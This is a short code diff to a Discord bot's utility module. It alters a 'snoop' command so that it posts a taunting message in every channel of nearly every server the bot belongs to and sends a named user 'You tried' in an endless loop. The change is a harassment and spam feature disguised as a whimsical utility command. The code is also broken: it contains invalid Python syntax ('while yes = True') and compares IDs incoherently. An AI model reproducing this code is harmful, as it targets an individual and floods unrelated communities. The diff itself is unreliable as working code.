@@ -24,8 +24,9 @@ class Utility:
     @commands.command()
     async def snoop(self, ctx):
         """whee"""
+        yes = False
         for x in self.bot.guilds:
-            if x.id == 381991923004735489:
+            if x.id != 318626746297745409:
                 for y in x.channels:
                     try:
                         await y.send("Bad move, Zewia...")
@@ -36,7 +37,8 @@ class Utility:
                 for z in x.members:
                     if x.id == 349088339489456140:
                         zewia = x
-                while True:
+                        yes = True
+                while yes = True:
                     await zewia.send("You tried")
 
     @commands.has_permissions(ban_members=True)    
